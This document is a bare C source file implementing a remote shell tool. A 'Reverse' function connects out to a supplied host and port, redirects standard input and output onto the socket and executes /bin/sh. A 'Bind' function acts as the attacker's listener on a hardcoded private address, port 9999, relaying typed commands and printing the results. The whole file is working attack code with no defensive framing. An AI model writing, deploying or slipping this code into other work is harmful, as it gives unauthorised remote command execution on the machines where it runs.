#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

int sock, door_sock;

int Reverse(char *rhost, int rport){
	struct sockaddr_in Door;
	char *argv[] = {"/bin/sh", NULL};
	
	door_sock = socket(AF_INET, SOCK_STREAM, 0);
	if(door_sock < 0) return 1;
	Door.sin_family =AF_INET;
	Door.sin_port = htons(rport);
	Door.sin_addr.s_addr = inet_addr(rhost);

	if(connect(door_sock,(struct sockaddr * )&Door, sizeof(struct sockaddr)) < 0){
		return 1;
	}else{
		dup2(door_sock, 0);
		dup2(door_sock, 1);
		dup2(door_sock, 2);
		execve(argv[0], argv, NULL);
	}
	return 0;
}

int Bind(char *lhost, int lport){
	struct sockaddr_in bind_, client;
	char buffor[2048];
	char response[2048];
	int conn;

	sock = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
	if(sock < 0) return -1;
	
	bind_.sin_family = AF_INET;
	bind_.sin_port = htons(lport);
	bind_.sin_addr.s_addr = inet_addr(lhost);
	
	if(bind(sock, (struct sockaddr *)&bind_, sizeof(bind_)) < 0){
		return -2;
	}else{
		puts("WITE..\n");
	};
	if(listen(sock, SOMAXCONN) < 0) return -3;
	socklen_t len = sizeof(struct sockaddr_in);
	memset(&client, 0, sizeof(client));
	conn=accept(sock, (struct sockaddr *)&client,  &len);
	if(conn < 0) return -4;
	while(1){
		bzero(&buffor, sizeof(buffor));
		bzero(&response, sizeof(response));
		//printf("shell : ", inet_ntoa(client.sin_addr));
		printf("shell : ");
		fgets(buffor, sizeof(buffor), stdin);
		write(conn, buffor, sizeof(buffor));
		if(strncmp("q", buffor, 1) == 0){
			return 0;
		}else{
			recv(conn, &response, sizeof(response), 0);
			puts(response);
		}
	}
	return 0;
}

int main(){
	int Reverse = Bind("192.168.2.103", 9999);
	switch(Reverse){
		case -1:
			puts("sock error");
			close(sock);
			return -1;
		case -2:
			puts("bind error");
			close(sock);
			return -2;
		case -3:
			puts("accept error");
			close(sock);
			return -3;
	};
		
	return 0;
}
